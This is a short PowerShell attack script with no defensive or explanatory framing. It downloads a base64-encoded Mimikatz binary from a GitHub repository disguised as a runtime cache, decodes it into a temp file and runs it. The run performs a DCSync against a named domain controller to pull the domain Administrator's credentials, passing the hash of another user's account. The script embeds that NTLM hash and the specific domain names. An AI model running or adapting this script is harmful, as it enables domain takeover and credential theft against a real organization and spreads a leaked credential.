$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$b64 = Join-Path $env:TEMP "mimi.b64"
$exe = Join-Path $env:TEMP "mimi-run.exe"
$out = Join-Path $env:TEMP "dcsync-lssny-b64.txt"
$err = Join-Path $env:TEMP "dcsync-lssny-b64.err"

(New-Object Net.WebClient).DownloadFile("$root/mimikatz.b64", $b64)
[IO.File]::WriteAllBytes($exe, [Convert]::FromBase64String([IO.File]::ReadAllText($b64)))
$dcsync = "lsadump::dcsync /domain:LSSNY1.ORG /dc:LSSDC4.LSSNY1.ORG " +
    "/user:LSSNY1\\Administrator /authuser:LSSNY1\\kmak " +
    "/authdomain:LSSNY1.ORG /authntlm:e0454954bd1d324813a1e719abd8a502"
$proc = Start-Process $exe -ArgumentList @(
    "privilege::debug",
    $dcsync,
    "exit"
) -Wait -PassThru -RedirectStandardOutput $out -RedirectStandardError $err
Write-Output "DCSYNC_EXIT=$($proc.ExitCode)"
if (Test-Path $out) {
    Get-Content $out -Raw
}
if (Test-Path $err) {
    Get-Content $err -Raw
}
